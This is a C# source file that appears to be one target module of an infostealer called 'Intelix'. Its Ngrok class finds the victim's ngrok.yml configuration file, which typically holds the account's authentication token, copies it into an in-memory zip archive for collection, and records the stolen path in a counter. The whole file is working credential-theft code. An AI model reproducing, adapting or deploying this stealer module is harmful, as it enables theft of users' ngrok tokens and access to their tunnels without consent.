using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications;

public class Ngrok : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
		if (File.Exists(text))
		{
			string text2 = "Ngrok\\ngrok.yml";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Ngrok";
			zip.AddFile(text2, File.ReadAllBytes(text));
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Applications.Add(counterApplications);
		}
	}
}
